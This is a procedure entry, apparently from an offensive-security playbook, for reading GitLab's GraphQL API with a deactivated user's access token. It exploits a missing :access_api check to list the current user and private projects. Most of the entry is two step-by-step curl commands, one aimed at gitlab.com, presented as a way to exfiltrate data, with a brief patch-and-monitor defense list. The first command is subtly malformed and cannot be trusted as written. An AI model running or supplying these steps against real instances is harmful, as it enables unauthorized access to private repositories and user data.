---
tags:
  - graphql
  - query
  - read-access
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-graphql-currentuser-query]]'
  - '[[commands/curl-graphql-projects-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:59.523Z'
sub_techniques: []
id: 52bc8e29-f771-4856-b652-023519ebb7c3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Query-GraphQL-API-with-Deactivated-Token

## Summary

This procedure tests read access to GitLab's GraphQL API using a personal access token from a deactivated user, demonstrating unauthorized data retrieval.

## Description

The GraphQL endpoint (/api/graphql) only checks for :log_in permission and token scope, ignoring :access_api restrictions from global_policy.rb. This allows fetching user info, projects, etc. Tested via curl; impacts include data exfiltration and revenue loss from unbilled access.

## Requirements

1. Deactivated user token with api scope
2. Network access to GitLab API
3. curl installed

## Defense

Defensive measures and detection strategies:

- Update to GitLab 13.11.2+ for partial fixes
- Monitor GraphQL logs for anomalous queries
- Enforce stricter token scopes

## Objectives

1. Retrieve current user data
2. List projects including sensitive ones
3. Confirm bypass of deactivation

## Instructions

### Step 1: Basic User Query

**Context**: Fetch current user ID to verify authentication.

**Command** ([[commands/curl-graphql-currentuser-query]]):
```bash
curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{"query":"{\n currentUser{id}\n}"}'}'
```

> Returns user ID if successful, proving access.

### Step 2: Query Projects

**Context**: Access potentially sensitive project data.

**Command** ([[commands/curl-graphql-projects-query]]):
```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' --data '{"query":"query {\nprojects{\n nodes{\n id\n name\n }\n}\n}\n"}'
```

> Lists projects, including private ones if permissions allow.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-currentuser-query]]
- [[commands/curl-graphql-projects-query]]

## Tools Used

- [[tools/curl]]

## Tags

- graphql
- deactivated
- data-access
